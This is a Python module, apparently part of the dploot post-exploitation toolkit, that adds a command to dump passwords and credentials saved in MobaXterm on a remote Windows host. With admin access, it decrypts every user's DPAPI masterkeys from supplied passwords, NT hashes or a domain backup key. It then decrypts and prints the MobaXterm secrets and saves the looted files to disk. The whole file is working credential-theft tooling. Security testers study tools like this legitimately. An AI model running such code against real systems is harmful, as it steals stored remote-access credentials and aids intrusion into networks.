import argparse
import logging
from typing import Callable, Tuple

from dploot.action import DPLootAction
from dploot.action.masterkeys import add_user_masterkeys_argument_group
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.masterkeys import MasterkeysTriage
from dploot.triage.mobaxterm import MobaXtermTriage

NAME = "mobaxterm"


class MobaXtermAction(DPLootAction):
    def __init__(self, options: argparse.Namespace) -> None:
        super().init_triage_user(options)

    def run(self) -> None:
        super().run()
        if self.conn.is_admin():
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    pvkbytes=self.pvkbytes,
                    nthashes=self.nthashes,
                    passwords=self.passwords,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys = masterkeytriage.triage_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            def secret_callback(secret):
                if self.options.quiet:
                    secret.dump_quiet()
                else:
                    secret.dump()

            triage = MobaXtermTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_secret_callback=secret_callback,
            )
            logging.info("Triage MobaXterm Secrets\n")
            triage.triage_mobaxterm()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, triage.looted_files)
        else:
            logging.info("Not an admin, exiting...")

def entry(options: argparse.Namespace) -> None:
    a = MobaXtermAction(options)
    a.run()

def add_subparser(subparsers: argparse._SubParsersAction, protocol: str) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME, help="Dump Passwords and Credentials from MobaXterm"
    )

    group = subparser.add_argument_group("mobaxterm options")

    group.add_argument(
        "--mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    add_user_masterkeys_argument_group(group)
    DPLootAction.add_general_args(subparser, protocol)

    return NAME, entry
